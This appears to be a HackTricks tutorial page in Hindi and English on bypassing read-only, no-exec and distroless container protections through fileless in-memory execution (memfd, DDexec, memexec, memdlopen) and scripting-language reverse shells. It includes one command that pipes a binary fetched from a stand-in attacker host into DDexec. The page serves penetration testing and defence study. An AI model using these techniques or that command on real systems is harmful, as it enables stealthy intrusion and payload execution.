# FS protections को bypass करना: read-only / no-exec / Distroless

{{#include ../../../../banners/hacktricks-training.md}}

## Videos

निम्नलिखित videos में इस page पर बताई गई techniques को अधिक विस्तार से समझाया गया है:<sup>[[1]](#references)[[2]](#references)</sup>

- [**DEF CON 31 - Exploring Linux Memory Manipulation for Stealth and Evasion**](https://www.youtube.com/watch?v=poHirez8jk4)<sup>[[1]](#references)</sup>
- [**Stealth intrusions with DDexec-ng & in-memory dlopen() - HackTricks Track 2023**](https://www.youtube.com/watch?v=VM_gjjiARaU)<sup>[[2]](#references)</sup>

## read-only / no-exec scenario

linux machines को **read-only (ro) file system protection** के साथ mount किया हुआ मिलना अधिक सामान्य होता जा रहा है, विशेष रूप से containers में। ऐसा इसलिए है क्योंकि container को ro file system के साथ चलाना `securitycontext` में केवल **`readOnlyRootFilesystem: true`** set करने जितना आसान है:

<pre class="language-yaml"><code class="lang-yaml">apiVersion: v1
kind: Pod
metadata:
name: alpine-pod
spec:
containers:
- name: alpine
image: alpine
securityContext:
<strong>      readOnlyRootFilesystem: true
</strong>    command: ["sh", "-c", "while true; do sleep 1000; done"]
</code></pre>

हालांकि file system को ro के रूप में mount किया गया हो, **`/dev/shm`** फिर भी writable रहेगा, इसलिए यह गलत है कि हम disk पर कुछ भी write नहीं कर सकते। हालांकि, यह folder **no-exec protection** के साथ **mounted** होगा, इसलिए यदि आप यहां कोई binary download करते हैं, तो आप उसे **execute नहीं कर पाएंगे**।

> [!WARNING]
> Red team के perspective से, इससे उन binaries को **download और execute करना कठिन हो जाता है** जो system में पहले से मौजूद नहीं हैं (जैसे backdoors या `kubectl` जैसे enumerators)।

## सबसे आसान bypass: Scripts

ध्यान दें कि मैंने binaries का उल्लेख किया था; आप कोई भी script **execute कर सकते हैं**, जब तक उसका interpreter machine के अंदर मौजूद हो। उदाहरण के लिए, यदि `sh` मौजूद है तो **shell script**, या यदि `python` installed है तो **python** **script**।

हालांकि, आपके binary backdoor या किसी अन्य binary tools को run करने के लिए यह पर्याप्त नहीं है।

## Memory Bypasses

यदि आप किसी binary को execute करना चाहते हैं, लेकिन file system इसकी अनुमति नहीं दे रहा है, तो ऐसा करने का सबसे अच्छा तरीका उसे **memory से execute करना** है, क्योंकि **protections वहां लागू नहीं होतीं**।

### FD + exec syscall bypass

यदि machine के अंदर आपके पास कुछ powerful script engines हैं, जैसे **Python**, **Perl**, या **Ruby**, तो आप execute करने वाली binary को memory में download कर सकते हैं, उसे एक memory file descriptor (`create_memfd` syscall) में store कर सकते हैं, जो इन protections से protected नहीं होगा, और फिर **`exec` syscall** को call कर सकते हैं, जिसमें **fd को execute की जाने वाली file** के रूप में specify किया जाता है।

इसके लिए आप आसानी से [**fileless-elf-exec**](https://github.com/nnsee/fileless-elf-exec) project का उपयोग कर सकते हैं। आप इसे एक binary दे सकते हैं और यह indicated language में एक script generate करेगा, जिसमें **binary compressed और b64 encoded** होगी, साथ में उसे **decode और decompress करने** के instructions होंगे। यह binary `create_memfd` syscall को call करके बनाए गए **fd** में store होगी और उसे run करने के लिए **exec** syscall को call किया जाएगा।

> [!WARNING]
> यह PHP या Node जैसी अन्य scripting languages में काम नहीं करता, क्योंकि उनके पास script से raw syscalls को call करने का कोई **default तरीका नहीं होता**। इसलिए binary को store करने के लिए **memory fd** बनाने हेतु `create_memfd` को call करना संभव नहीं है।
>
> इसके अलावा, `/dev/shm` में file के साथ एक **regular fd** बनाने से भी काम नहीं चलेगा, क्योंकि आप उसे run नहीं कर पाएंगे और **no-exec protection** लागू होगी।

### DDexec / EverythingExec

[**DDexec / EverythingExec**](https://github.com/arget13/DDexec) एक technique है, जो आपके **own process की memory को modify** करने की अनुमति देती है, इसके **`/proc/self/mem`** को overwrite करके।

इसलिए, process द्वारा execute किए जा रहे **assembly code को control** करके, आप एक **shellcode** लिख सकते हैं और process को "mutate" करके **कोई भी arbitrary code execute** करा सकते हैं।

> [!TIP]
> **DDexec / EverythingExec** आपको अपना **shellcode** या **कोई भी binary** **memory** से load और **execute** करने की अनुमति देगा।
```bash
# Basic example
wget -O- https://attacker.com/binary.elf | base64 -w0 | bash ddexec.sh argv0 foo bar
```
अधिक जानकारी के लिए इस technique को Github पर देखें या:

{{#ref}}
ddexec.md
{{#endref}}

### MemExec

[**Memexec**](https://github.com/arget13/memexec), DDexec का अगला स्वाभाविक चरण है। यह **DDexec shellcode demonised** है, इसलिए जब भी आपको **किसी अलग binary को run करना** हो, तो आपको DDexec को दोबारा launch करने की आवश्यकता नहीं होती। आप केवल DDexec technique के माध्यम से memexec shellcode run कर सकते हैं और फिर **इस deamon से communicate करके load और run करने के लिए नई binaries भेज सकते हैं**।

आप [https://github.com/arget13/memexec/blob/main/a.php](https://github.com/arget13/memexec/blob/main/a.php) में **PHP reverse shell से binaries execute करने के लिए memexec का उपयोग करने** का एक उदाहरण पा सकते हैं।

### Memdlopen

DDexec के समान उद्देश्य के साथ, [**memdlopen**](https://github.com/arget13/memdlopen) technique बाद में उन्हें execute करने के लिए **binaries को memory में load करने का आसान तरीका** प्रदान करती है। यह dependencies वाली binaries को भी load करने की अनुमति दे सकती है।

## Distroless Bypass

**distroless वास्तव में क्या है**, यह कब मदद करता है, कब नहीं करता, और containers में post-exploitation tradecraft को कैसे बदलता है, इसकी dedicated explanation के लिए देखें:

{{#ref}}
../../../containers-namespaces/container-security/distroless.md
{{#endref}}

### Distroless क्या है

Distroless containers में **किसी specific application या service को run करने के लिए आवश्यक bare minimum components** ही होते हैं, जैसे libraries और runtime dependencies, लेकिन package manager, shell या system utilities जैसे बड़े components शामिल नहीं होते।

Distroless containers का लक्ष्य **अनावश्यक components को हटाकर containers की attack surface को कम करना** और exploit की जा सकने वाली vulnerabilities की संख्या को न्यूनतम करना है।

### Reverse Shell

Distroless container में regular shell प्राप्त करने के लिए आपको **`sh` या `bash` भी न मिले**। आपको `ls`, `whoami`, `id` जैसी binaries भी नहीं मिलेंगी... यानी वे सभी चीजें जिन्हें आप सामान्यतः किसी system में run करते हैं।

> [!WARNING]
> इसलिए, आप सामान्य तरीके से **reverse shell** प्राप्त नहीं कर पाएंगे या system को **enumerate** नहीं कर पाएंगे।

हालाँकि, यदि compromised container उदाहरण के लिए flask web चला रहा है, तो Python installed होगा और इसलिए आप **Python reverse shell** प्राप्त कर सकते हैं। यदि वह node चला रहा है, तो आप Node rev shell प्राप्त कर सकते हैं, और यही बात लगभग किसी भी **scripting language** पर लागू होती है।

> [!TIP]
> Scripting language का उपयोग करके आप उसकी language capabilities के माध्यम से **system को enumerate** कर सकते हैं।

यदि **no `read-only/no-exec`** protections हैं, तो आप अपने reverse shell का दुरुपयोग करके **file system में अपनी binaries write** कर सकते हैं और उन्हें **execute** कर सकते हैं।

> [!TIP]
> हालाँकि, इस प्रकार के containers में ये protections आमतौर पर मौजूद होंगी, लेकिन आप **previous memory execution techniques का उपयोग करके उन्हें bypass** कर सकते हैं।

आप [**https://github.com/carlospolop/DistrolessRCE**](https://github.com/carlospolop/DistrolessRCE) में **कुछ RCE vulnerabilities को exploit करके** scripting languages के **reverse shells** प्राप्त करने और memory से binaries execute करने के **examples** पा सकते हैं।

## References

- [1] [DEF CON 31 - Exploring Linux Memory Manipulation for Stealth and Evasion](https://www.youtube.com/watch?v=poHirez8jk4)
- [2] [Stealth intrusions with DDexec-ng & in-memory dlopen() - HackTricks Track 2023](https://www.youtube.com/watch?v=VM_gjjiARaU)

{{#include ../../../../banners/hacktricks-training.md}}
